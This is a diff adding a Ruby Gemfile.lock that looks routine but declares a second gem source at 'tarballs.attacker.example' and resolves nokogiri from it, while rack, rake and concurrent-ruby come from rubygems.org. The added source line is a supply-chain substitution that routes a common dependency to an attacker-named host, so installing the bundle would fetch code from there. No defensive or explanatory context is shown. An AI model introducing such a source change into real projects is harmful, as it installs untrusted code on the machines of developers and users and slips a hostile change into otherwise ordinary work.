@@ -1,0 +1,22 @@
+GEM
+  remote: https://rubygems.org/
+  specs:
+    rack (3.0.9)
+    rake (13.1.0)
+    concurrent-ruby (1.2.3)
+
+GEM
+  remote: https://tarballs.attacker.example/
+  specs:
+    nokogiri (1.16.5)
+
+PLATFORMS
+  ruby
+
+DEPENDENCIES
+  nokogiri
+  rack
+  rake
+
+BUNDLED WITH
+   2.5.9
